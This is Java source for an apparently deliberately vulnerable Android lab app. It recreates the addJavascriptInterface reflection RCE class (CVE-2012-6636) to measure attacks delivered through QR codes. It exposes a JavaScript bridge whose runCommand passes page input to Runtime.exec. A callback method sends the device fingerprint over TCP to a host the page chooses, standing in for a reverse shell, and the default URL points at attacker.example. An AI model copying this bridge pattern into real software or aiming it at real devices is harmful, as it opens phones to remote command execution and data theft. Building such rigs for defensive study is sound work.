package com.qrcompromise.p6rig;

import android.app.Activity;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.util.Log;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.Socket;

/**
 * P6 RIG TARGET — DELIBERATELY VULNERABLE (LAB ONLY).
 *
 * AUTHORIZATION — LAB ONLY per docs/governance/policy.md §1 and §7: run only on
 * the project's emulator / owned test devices. This is the classic PUBLIC
 * example of the addJavascriptInterface (C1) chain class — CVE-2012-6636 and
 * kin, all patched platform-side since API 17 — rebuilt at a legacy targetSdk
 * (16) so the class can be measured and its defender telemetry captured
 * (mobile/rig/README.md).
 *
 * Why it is exploitable on purpose:
 *  - {@code targetSdk 16} (app/build.gradle): the Android 4.2 fix that blocks
 *    Java Reflection against bridge objects keys on the app's targetSdkVersion,
 *    so a legacy-target app keeps the full reflection surface on any OS build.
 *  - {@code addJavascriptInterface(new VulnBridge(), "Android")} without any
 *    @JavascriptInterface annotation: every public method (and, via reflection,
 *    Runtime.exec) is reachable from page JavaScript.
 *  - file access left on (C2 measurement surface).
 *
 * The bridge body is deliberately benign-by-default (policy §2): marker
 * commands and a TCP session-proof callback. It demonstrates that page JS can
 * drive app-process code (the shell primitive of the historical class) without
 * committing an attack payload.
 */
public class MainActivity extends Activity {

    static final String TAG = "P6RIG";
    /** Documentation placeholder (policy §2 / RFC 2606): replace per lab run. */
    static final String DEFAULT_URL = "http://attacker.example/p6rig/payload.html";

    private WebView web;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        web = new WebView(this);
        WebSettings s = web.getSettings();
        s.setJavaScriptEnabled(true);
        // Deliberately legacy (C2 measurement surface): file-scheme content loadable.
        s.setAllowFileAccess(true);
        s.setSavePassword(false);
        web.setWebViewClient(new WebViewClient());

        // ===== DELIBERATELY VULNERABLE BRIDGE (C1, CVE-2012-6636 class) =====
        // No @JavascriptInterface annotations anywhere in this class + targetSdk 16
        // => historical reflection RCE window is open for measurement.
        web.addJavascriptInterface(new VulnBridge(), "Android");

        setContentView(web);

        // U stage: the URL this activity is opened with (VIEW intent data —
        // i.e. what a QR-scanner app hands the phone) is rendered verbatim.
        Intent intent = getIntent();
        String url = intent != null ? intent.getDataString() : null;
        if (url == null || url.isEmpty()) {
            url = DEFAULT_URL;
        }
        Log.i(TAG, "loading url=" + url);
        web.loadUrl(url);
    }

    /** The deliberately exposed JS bridge object ("window.Android"). */
    class VulnBridge {

        /** E-stage reachability proof: page JS reached app-process code. */
        public String mark(String tag) {
            Log.i(TAG, "BRIDGE_REACHED mark=" + tag);
            return "p6rig:" + tag;
        }

        /**
         * The historical code-execution primitive of the class: page JS driving
         * Runtime.exec in the app process. Rig runs benign marker commands only
         * (e.g. "id", "log -p i -t P6RIGQR stage_e_exec_ok").
         */
        public String runCommand(String cmd) {
            Log.i(TAG, "BRIDGE_EXEC cmd=" + cmd);
            StringBuilder out = new StringBuilder();
            BufferedReader err = null;
            try {
                Process p = Runtime.getRuntime().exec(cmd);
                BufferedReader r = new BufferedReader(
                        new InputStreamReader(p.getInputStream()));
                String line;
                while ((line = r.readLine()) != null) {
                    out.append(line).append('\n');
                }
                p.waitFor();
                err = new BufferedReader(
                        new InputStreamReader(p.getErrorStream()));
                while ((line = err.readLine()) != null) {
                    out.append(line).append('\n');
                }
            } catch (Exception e) {
                Log.w(TAG, "runCommand failed: " + e);
                out.append("error: ").append(e);
            } finally {
                if (err != null) {
                    try {
                        err.close();
                    } catch (Exception ignore) {
                        // measurement rig; ignore
                    }
                }
            }
            Log.i(TAG, "BRIDGE_EXEC done");
            return out.toString();
        }

        /**
         * C stage: session-verification callback. Opens a TCP connection to the
         * Kali-side listener stub (mobile/rig/harness/listener_stub.py) and
         * sends a benign proof line. This stands in for the historical
         * "reverse shell" end-state so the session can be VERIFIED without
         * committing an attack payload (policy §2 demo-body rule).
         */
        public String callback(String host, int port) {
            Log.i(TAG, "BRIDGE_CALLBACK target=" + host + ":" + port);
            Socket sock = null;
            try {
                sock = new Socket(host, port);
                String proof = "P6RIG-SESSION device=" + Build.FINGERPRINT + "\n";
                sock.getOutputStream().write(proof.getBytes("UTF-8"));
                Log.i(TAG, "BRIDGE_CALLBACK sent");
                return "sent";
            } catch (Exception e) {
                Log.w(TAG, "BRIDGE_CALLBACK failed: " + e);
                return "error: " + e;
            } finally {
                if (sock != null) {
                    try {
                        sock.close();
                    } catch (Exception ignore) {
                        // measurement rig; ignore
                    }
                }
            }
        }
    }
}
